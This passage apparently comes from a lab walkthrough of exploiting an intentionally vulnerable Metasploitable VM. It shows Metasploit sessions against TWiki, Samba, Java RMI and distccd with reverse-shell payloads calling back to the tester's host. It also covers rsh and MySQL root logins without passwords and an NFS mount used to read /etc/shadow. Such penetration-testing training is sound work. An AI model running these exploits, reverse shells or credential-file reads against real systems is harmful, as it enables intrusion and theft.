<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/webapp/twiki_history
</span><span class='line'>msf exploit(twiki_history) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/webapp/twiki_history):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   Proxies                   no        Use a proxy chain
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    80               yes       The target port
</span><span class='line'>   URI      /twiki/bin       yes       TWiki bin directory path
</span><span class='line'>   VHOST                     no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(twiki_history) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(twiki_history) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(twiki_history) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo ZeiYbclsufvu4LGM;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Successfully sent exploit request
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "ZeiYbclsufvu4LGM\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo D0Yvs2n6TnTUDmPF;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:54381) at 2014-06-08 17:31:48 +0300
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "D0Yvs2n6TnTUDmPF\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>This is a low privilege shell, but we can escalate to root via the udev exploit, as shown later.</p>

<h3>Port 445 samba</h3>

<p>First, I&rsquo;ll use an auxiliary module to get the server&rsquo;s version:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/smb/smb_version
</span><span class='line'>msf auxiliary(smb_version) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/smb/smb_version):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   RHOSTS                      yes       The target address range or CIDR identifier
</span><span class='line'>   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
</span><span class='line'>   SMBPass                     no        The password for the specified username
</span><span class='line'>   SMBUser                     no        The username to authenticate as
</span><span class='line'>   THREADS    1                yes       The number of concurrent threads
</span><span class='line'>
</span><span class='line'>msf auxiliary(smb_version) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(smb_version) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:445 is running Unix Samba 3.0.20-Debian (language: Unknown) (domain:WORKGROUP)
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>With that information in hand, we can now use a suitable exploit against the target:</p>

<p><strong>Samba &ldquo;username map script&rdquo; Command Execution</strong></p>

<blockquote><p>This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default &ldquo;username map
script&rdquo; configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No
authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/samba/usermap_script
</span><span class='line'>msf exploit(usermap_script) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(usermap_script) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(usermap_script) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/reverse):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(usermap_script) &gt; set RPORT 445
</span><span class='line'>RPORT =&gt; 445
</span><span class='line'>msf exploit(usermap_script) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo f8rjvIDZRdKBtu0F;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "f8rjvIDZRdKBtu0F\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:46653) at 2014-06-04 22:23:23 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root
</span></code></pre></td></tr></table></div></figure>


<h3>Port 514 tcpwrapped</h3>

<p>The nmap scan revealed the port is open but it&rsquo;s tcpwrapped. Let&rsquo;s first see what that means:</p>

<blockquote><p>TCP Wrapper is a host-based networking access control list system, used to filter network access to Internet Protocol servers on (Unix-
like) operating systems such as Linux or BSD.  (Wikipedia)</p></blockquote>

<p>So we can conclude the port is protected by TCP Wrapper. If we try to netcat to the port, we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvn 192.168.127.154 514
</span><span class='line'>
</span><span class='line'>(UNKNOWN) [192.168.127.154] 514 (shell) open</span></code></pre></td></tr></table></div></figure>


<p>I ran a Nessus scan against the target, and according to the report, a critical vulnerability is present on this port:</p>

<p><strong>rsh Unauthenticated Access (via finger Information)</strong></p>

<p><strong>Synopsis</strong></p>

<p>It was possible to log on this machine without password.</p>

<p><strong>Description</strong></p>

<p>Using common usernames as well as the usernames reported by &lsquo;finger&rsquo;, Nessus was able to log in through rsh. Either the accounts are not protected by passwords or the ~/.rhosts files are not configured properly.</p>

<p>This vulnerability is confirmed to exist in Cisco Prime LAN Management Solution, but could be present on any host that is not securely configured.</p>

<p><strong>Port</strong><br/>
tcp/514</p>

<p>So all we have to do is log in via the remote shell program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsh 192.168.127.154
</span><span class='line'>
</span><span class='line'>Last login: Wed May  7 11:00:37 EDT 2014 from :0.0 on pts/0
</span><span class='line'>
</span><span class='line'>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>To access official Ubuntu documentation, please visit:
</span><span class='line'>
</span><span class='line'>http://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>You have mail.
</span><span class='line'>
</span><span class='line'>root@metasploitable:~#</span></code></pre></td></tr></table></div></figure>


<h3>Port 1099 java-rmi</h3>

<p>Let&rsquo;s continue our exploitation. Anything labeled Java is bound to be interesting from a security perspective :)</p>

<p>Searching for Java exploits yielded something interesting:</p>

<p><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong></p>

<blockquote><p>This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from
any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be
used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java
Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java
process. RMI method calls do not support or require any sort of authentication.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/misc/java_rmi_server  
</span><span class='line'>msf exploit(java_rmi_server) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/misc/java_rmi_server):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    1099             yes       The target port
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT  8080             yes       The local port to listen on.
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                   no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Generic (Java Payload)
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set payload java/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; java/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(java_rmi_server) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/misc/java_rmi_server):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST    192.168.127.154  yes       The target address
</span><span class='line'>   RPORT    1099             yes       The target port
</span><span class='line'>   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT  8080             yes       The local port to listen on.
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                   no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (java/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Generic (Java Payload)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(java_rmi_server) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(java_rmi_server) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Using URL: http://0.0.0.0:8080/oVUJAkfU
</span><span class='line'>[*]  Local IP: http://192.168.127.159:8080/oVUJAkfU
</span><span class='line'>[*] Connected and sending request for http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar
</span><span class='line'>[*] 192.168.127.154  java_rmi_server - Replied to request for payload JAR
</span><span class='line'>[*] Sending stage (30355 bytes) to 192.168.127.154
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:36965) at 2014-06-04 22:42:17 +0300
</span><span class='line'>[+] Target 192.168.127.154:1099 may be exploitable...
</span><span class='line'>[*] Server stopped.
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: root
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<h3>Port 1524 shell</h3>

<p>Well, not much to say here. There&rsquo;s already a nice, cozy shell waiting for connections, so nothing extra needs to be done.</p>

<h3>Port 2049 nfs</h3>

<p>Let&rsquo;s use the the <strong>showmount</strong> command to see the NFS server&rsquo;s export list. This command displays mount information for an NFS server. The -e flag is for showing exports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.127.154
</span><span class='line'>
</span><span class='line'>Export list for 192.168.127.154:
</span><span class='line'>
</span><span class='line'>/ *</span></code></pre></td></tr></table></div></figure>


<p>How nice! The root directory is shared. So, let&rsquo;s mount it then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /metafs # this will be the mount point
</span><span class='line'>
</span><span class='line'>mount -t nfs 192.168.127.154:/ /metafs -o nolock # mount the remote shared directory as nfs and disable file locking</span></code></pre></td></tr></table></div></figure>


<p>Now we can read  the passwords and everything else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /metafs/etc/shadow
</span><span class='line'>
</span><span class='line'>root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
</span><span class='line'>
</span><span class='line'>..........etc..........</span></code></pre></td></tr></table></div></figure>


<h3>Port 3306 mysql</h3>

<p>The Nessus scan that I ran against the target revealed the following:</p>

<p><strong>MySQL Unpassworded Account Check</strong></p>

<p><strong>Synopsis</strong></p>

<p>The remote database server can be accessed without a password.</p>

<p><strong>Description</strong></p>

<p>It is possible to connect to the remote MySQL database server using an unpassworded account. This may allow an
attacker to launch further attacks against the database.</p>

<p>The &lsquo;root&rsquo; account does not have a password.
Here is the list of databases on the remote server :
&ndash; information_schema
&ndash; dvwa
&ndash; metasploit
&ndash; mysql
&ndash; owasp10
&ndash; tikiwiki
&ndash; tikiwiki195</p>

<p>Let&rsquo;s see if we can indeed connect to the database as root without a password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -p -h 192.168.127.154
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 7
</span><span class='line'>Server version: 5.0.51a-3ubuntu5 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>Now we can look inside the databases and get any data that might interest us.</p>

<h3>Port 3632 distccd</h3>

<p>distccd  is  the  server  for  the  distcc distributed compiler. It accepts and runs compilation jobs for network clients. Metasploit has an exploit avaiable for this:</p>

<p><strong>DistCC Daemon Command Execution</strong></p>

<blockquote><p>This module uses a documented security weakness to execute arbitrary commands on any system running distccd.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/misc/distcc_exec
</span><span class='line'>msf exploit(distcc_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/misc/distcc_exec):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  3632             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(distcc_exec) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(distcc_exec) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(distcc_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/misc/distcc_exec):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  3632             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/reverse):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST                   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(distcc_exec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(distcc_exec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo VhuwDGXAoBmUMNcg;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "VhuwDGXAoBmUMNcg\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:52283) at 2014-06-05 21:34:46 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>daemon</span></code></pre></td></tr></table></div></figure>


<p>So we have a low privilege account. Time for some local privilege escalation. I will use this exploit: <a href="http://www.exploit-db.com/exploits/8572/">http://www.exploit-db.com/exploits/8572/</a></p>

<p><strong>Description</strong></p>

<p>udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.</p>

<p><strong>Usage</strong></p>

<p>Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, usually is the udevd PID minus 1) as argv[1].</p>

<p>The exploit will execute /tmp/run as root so throw whatever payload you want in there.</p>

<p>Ok, on the command line on the victim, I looked for netcat and fortunately, it&rsquo;s installed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whereis nc
</span><span class='line'>nc: /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz</span></code></pre></td></tr></table></div></figure>


<p>So I will compile the exploit and send it over netcat. I am on a 64 bit Kali and the target is 32 bit, so I compile it explicitly for 32 bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
